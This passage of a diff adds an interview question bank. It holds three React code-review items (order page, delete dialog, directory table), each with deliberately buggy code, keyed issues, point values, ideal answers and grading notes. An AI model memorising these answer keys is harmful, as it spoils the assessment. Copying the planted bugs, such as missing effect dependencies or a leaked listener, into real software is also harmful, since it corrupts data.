+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.craft.correctness",
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state",
+      "engineering.frontend.browser_network"
+    ],
+    "prompt": "This page shows one order to support staff. React Router renders it at `/orders/:orderId`. Staff often click \"Next order\", which changes `orderId` in the URL; the router keeps the same page component mounted when only the id changes. Staff write internal notes on the order and save them.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function OrderDetailsPage() {\n  const { orderId } = useParams();\n  const [order, setOrder] = useState(null);\n  const [notes, setNotes] = useState('');\n\n  useEffect(() => {\n    fetch(`/api/orders/${orderId}`)\n      .then((res) => res.json())\n      .then((data) => {\n        setOrder(data);\n        setNotes(data.notes);\n      });\n  }, []);\n\n  async function saveNotes() {\n    await fetch(`/api/orders/${orderId}/notes`, {\n      method: 'PUT',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ notes }),\n    });\n  }\n\n  if (!order) return <p>Loading...</p>;\n\n  return (\n    <div>\n      <h1>Order {order.number}</h1>\n      <p>Status: {order.status}</p>\n      <textarea value={notes} onChange={(e) => setNotes(e.target.value)} />\n      <button type=\"button\" onClick={saveNotes}>Save notes</button>\n      <Link to={`/orders/${order.nextId}`}>Next order</Link>\n    </div>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "effect_missing_order_id_dependency",
+          "severity": "critical",
+          "points": 3,
+          "description": "The load effect has an empty dependency list, so it runs only once. After \"Next order\" the page keeps showing the first order and its notes, while saveNotes uses the new orderId, so saving writes the previous order's notes over the next order's notes."
+        },
+        {
+          "id": "load_errors_not_handled",
+          "severity": "major",
+          "points": 2,
+          "description": "res.ok is not checked and there is no catch. A 404 or 500 sets an error object as the order (the page shows \"Order \" with no number), and a network error leaves \"Loading...\" on screen forever with an unhandled rejection."
+        },
+        {
+          "id": "save_without_feedback",
+          "severity": "major",
+          "points": 2,
+          "description": "saveNotes gives no feedback and ignores failures: the user cannot tell whether the notes were saved, and a failed PUT (error status or network) is silent, so notes the user thinks are saved are lost."
+        },
+        {
+          "id": "next_link_without_next_order",
+          "severity": "minor",
+          "points": 1,
+          "description": "The \"Next order\" link is rendered even when there is no next order, which leads to /orders/null or /orders/undefined."
+        }
+      ],
+      "ideal_answer": "1. The effect ignores orderId (critical). With [] the order loads once. Clicking \"Next order\" changes the URL, but the page still shows order 1 and its notes. saveNotes then sends order 1's notes to /api/orders/2/notes, overwriting order 2's notes. Fix: add orderId to the dependency list, reset order and notes when it changes, and ignore or abort the old request in the cleanup so a slow response for the previous order cannot overwrite the new one.\n2. Load errors not handled (major). Fix: check res.ok, catch errors, keep an error state, show a clear \"order not found\" message for 404 and a retry for other failures.\n3. Saving gives no feedback and ignores failures (major). Fix: a saving / saved / failed state, disable the button while saving, check res.ok and show an error so the user can try again; consider warning before leaving with unsaved notes.\n4. \"Next order\" shown without a next order (minor). Fix: render the link only when order.nextId exists.\nNot a problem: the early return <p>Loading...</p>. It comes after all the hooks, so the rules of hooks are respected.\nValid extras (not false alarms, but not keyed): the textarea has no label; setNotes(data.notes) can receive undefined and switch the textarea from controlled to uncontrolled, so default to an empty string."
+    },
+    "explanation": "Behaviour was checked in React 18 with jsdom: after the id changed, the heading still showed order 1, and Save sent order 1's notes to /api/orders/2/notes. Critical because it silently corrupts another order's data. Load errors and silent save failures are both major, in either order. Red herring: the early return after the hooks is valid; claiming it breaks the rules of hooks earns nothing. Adding orderId to the dependencies earns most of the points for issue 1; full marks also mention resetting state or ignoring stale responses.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.confirm-delete-dialog",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state",
+      "engineering.craft.correctness"
+    ],
+    "prompt": "This React component is the dialog shown before a project is deleted. The parent renders it only while a project is chosen for deletion: `{project && <ConfirmDeleteDialog projectName={project.name} onConfirm={() => deleteProject(project.id)} onClose={() => setProject(null)} />}`. `deleteProject` returns a promise that deletes the project through the API. Pressing Escape should cancel and pressing Enter should confirm.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function ConfirmDeleteDialog({ projectName, onConfirm, onClose }) {\n  const [deleting, setDeleting] = useState(false);\n\n  useEffect(() => {\n    document.addEventListener('keydown', (e) => {\n      if (e.key === 'Escape') onClose();\n      if (e.key === 'Enter') handleDelete();\n    });\n  }, []);\n\n  async function handleDelete() {\n    setDeleting(true);\n    await onConfirm();\n    onClose();\n  }\n\n  return (\n    <div className=\"backdrop\" onClick={onClose}>\n      <div className=\"dialog\" onClick={(e) => e.stopPropagation()}>\n        <h2>Delete {projectName}?</h2>\n        <p>This deletes the project and all its files. It cannot be undone.</p>\n        <div className=\"btn btn-secondary\" onClick={onClose}>Cancel</div>\n        <div className=\"btn btn-danger\" onClick={handleDelete}>\n          {deleting ? 'Deleting...' : 'Delete project'}\n        </div>\n      </div>\n    </div>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "leaked_keydown_deletes_cancelled_projects",
+          "severity": "critical",
+          "points": 3,
+          "description": "The document keydown listener is added every time the dialog opens and never removed, and each one keeps the handleDelete and onConfirm of the dialog it came from. After the user cancels \"Delete Alpha\", pressing Enter anywhere in the app (or to confirm deleting another project later) still calls Alpha's onConfirm, so a project the user chose to keep is deleted, with no undo. Every dialog opened adds another listener."
+        },
+        {
+          "id": "div_buttons_not_keyboard_accessible",
+          "severity": "major",
+          "points": 2,
+          "description": "Cancel and Delete are <div>s with onClick: they cannot be reached with Tab, Enter and Space do nothing on them, and screen readers do not announce them as buttons. Keyboard and screen-reader users depend on document-wide shortcuts they are never told about."
+        },
+        {
+          "id": "no_dialog_semantics_or_focus",
+          "severity": "major",
+          "points": 2,
+          "description": "It is not a real modal for assistive technology: no role=\"dialog\", aria-modal or aria-labelledby, focus is not moved into the dialog, Tab can reach the page behind it, and focus is not returned to the button that opened it."
+        },
+        {
+          "id": "double_delete_and_unhandled_failure",
+          "severity": "minor",
+          "points": 1,
+          "description": "While \"Deleting...\" is shown, Delete (or Enter) can be used again and onConfirm runs a second time; if onConfirm rejects, the dialog stays on \"Deleting...\" forever and the error is unhandled."
+        }
+      ],
+      "ideal_answer": "1. The leaked keydown listener deletes cancelled projects (critical). The effect adds a listener to document every time the dialog opens and never removes it, and each listener keeps the handleDelete and onConfirm of the dialog that added it. So after the user cancels \"Delete Alpha\", pressing Enter anywhere (in a search box, or to confirm deleting Beta later) still calls Alpha's onConfirm and deletes Alpha, which the user chose to keep; each opened dialog adds another listener, so one Enter can delete several projects. Fix: name the handler and return a cleanup that calls removeEventListener; keep the latest callbacks in the dependency list or a ref. Better, drop the document-wide Enter shortcut and let Enter press the focused button (with focus starting on Cancel), or use the native <dialog> element, which handles Escape itself.\n2. Cancel and Delete are divs (major). Keyboard users cannot reach or press them, and screen readers do not say they are buttons. Fix: <button type=\"button\"> for both, with the same styles.\n3. No dialog semantics or focus management (major). Screen-reader users are not told a dialog opened, focus stays on the page behind it, and Tab can leave the dialog. Fix: use the native <dialog> element with showModal() (which handles focus, Escape and the inert background), or add role=\"dialog\", aria-modal=\"true\" and aria-labelledby on the heading, move focus to Cancel on open, keep Tab inside, and return focus to the opening button on close.\n4. Delete can run twice, failures not handled (minor). Fix: ignore clicks and Enter while deleting (disable the button), use try/catch, show an error and reset deleting on failure.\nThe two major issues can come in either order.\nNot a problem: e.stopPropagation() on the inner box. It is the intended way to stop a click inside the dialog from reaching the backdrop and closing it.\nValid extras (not false alarms, but not keyed): a document-wide Enter shortcut on a destructive dialog is risky even with cleanup (once real buttons exist, Enter on a focused Cancel would also confirm); closing a destructive confirmation on a backdrop click is debatable because it is easy to do by accident; putting initial focus on Cancel rather than Delete is the safer default."
+    },
+    "explanation": "Behaviour was checked in React 18 with jsdom: after the dialog for Alpha was cancelled, one Enter keypress on the page called deleteProject for Alpha; after Beta was cancelled with Escape, confirming Gamma with Enter deleted Alpha, Beta and Gamma. The leaked listener is critical because projects the user chose to keep are deleted for good. A candidate who flags the listener only as a memory leak, without seeing that it deletes cancelled projects, gets partial credit for issue 1. Then two majors in either order (div buttons, missing dialog semantics and focus management) and one minor (double delete and stuck state). The div buttons are major, not critical, because the mouse and the shortcuts still work; a candidate who rates them critical loses only ordering credit. Red herring: stopPropagation on the inner box is correct and needed. Suggesting the native <dialog> element with showModal() is a full-credit fix for issue 3.",
+    "expected_time_s": 480
+  },
+  {
+    "bank_key": "swe.frontend.r.employee-directory-table",
+    "type": "code_review",
+    "section": "review",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": null,
+    "languages": [
+      "javascript"
+    ],
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.components_state",
+    "secondary_skill_codes": [
+      "engineering.frontend.rendering",
+      "engineering.frontend.accessibility"
+    ],
+    "prompt": "This React component shows the company directory. The parent loads all employees (about 2,000) and passes them in as `employees`; it reloads the list from the server every few minutes. Users can filter by name and sort by clicking a column header.\n\nList the problems, most serious first, and how you would fix each.",
+    "review": {
+      "code": {
+        "javascript": "function EmployeeTable({ employees }) {\n  const [query, setQuery] = useState('');\n  const [sortKey, setSortKey] = useState('name');\n  const [visible, setVisible] = useState(employees);\n\n  useEffect(() => {\n    const q = query.toLowerCase();\n    setVisible(employees.filter((e) => e.name.toLowerCase().includes(q)));\n  }, [query]);\n\n  const sorted = visible.sort((a, b) => a[sortKey].localeCompare(b[sortKey]));\n\n  return (\n    <div>\n      <input placeholder=\"Filter by name\" value={query}\n        onChange={(e) => setQuery(e.target.value)} />\n      <table>\n        <thead>\n          <tr>\n            <th onClick={() => setSortKey('name')}>Name</th>\n            <th onClick={() => setSortKey('team')}>Team</th>\n          </tr>\n        </thead>\n        <tbody>\n          {sorted.map((e) => (\n            <tr key={e.id}><td>{e.name}</td><td>{e.team}</td></tr>\n          ))}\n        </tbody>\n      </table>\n    </div>\n  );\n}\n"
+      },
+      "issues": [
+        {
+          "id": "filtered_list_copied_into_state",
+          "severity": "major",
+          "points": 2,
+          "description": "visible is state copied from the employees prop and recalculated only when query changes (employees is missing from the dependencies). When the parent reloads the list, the table keeps showing the old employees until the user types in the filter."
+        },
+        {
+          "id": "sort_mutates_array",
+          "severity": "major",
+          "points": 2,
+          "description": "Array.prototype.sort sorts in place. On the first render visible is the same array as the employees prop, so the component reorders the parent's data; later it reorders its own state during render."
+        },
+        {
+          "id": "sort_headers_mouse_only",
+          "severity": "minor",
+          "points": 1,
+          "description": "Sorting is a click handler on <th>: the headers cannot be focused or used with the keyboard, and nothing tells screen-reader users that a column is sortable or how it is sorted."
+        },
+        {
+          "id": "filter_input_unlabelled",
+          "severity": "minor",
+          "points": 1,
+          "description": "The filter input has only a placeholder, no label."
+        }
+      ],
+      "ideal_answer": "1. Filtered list copied into state, goes stale (major). visible starts as employees and is recalculated only when query changes. When the parent reloads employees (people join, leave or change team), the table keeps showing the old list until someone types. Each filter change also renders once with the previous list before the effect runs. Fix: remove the visible state and the effect, and calculate during render: const shown = useMemo(() => [...employees].filter(...).sort(...), [employees, query, sortKey]).\n2. sort() mutates the array (major). On the first render visible === employees, so the parent's array is reordered in place; other parts of the app that use it see a changed order, and mutating during render breaks React's assumption that rendering has no side effects. Fix: sort a copy, [...list].sort(...) or list.toSorted(...).\n3. Sort headers only work with a mouse (minor). Fix: put a <button> inside each <th> and set aria-sort=\"ascending\" on the sorted column.\n4. Filter input has no label (minor). Fix: a visible <label> or aria-label=\"Filter by name\".\nThe two major issues may come in either order.\nNot a problem: filtering and sorting about 2,000 rows in the browser on each render. That is fast; useMemo is a nice addition, not a required fix, and a server-side search is not needed.\nValid extras (not false alarms, but not keyed): localeCompare throws if a team is null; the filter could also match teams; useDeferredValue keeps typing smooth on slow devices."
+    },
+    "explanation": "Behaviour was checked in React 18 with jsdom: after the first render the parent's array was reordered (Adam before Zoe), and after the parent passed a new list the table still showed the old names. Both majors may come in either order. Adding employees to the effect's dependencies earns most of the points for issue 1; full marks remove the copied state and derive the list. Red herring: client-side filtering of 2,000 rows is fine; \"move this to the server for performance\" earns nothing.",
+    "expected_time_s": 480
+  }
+]
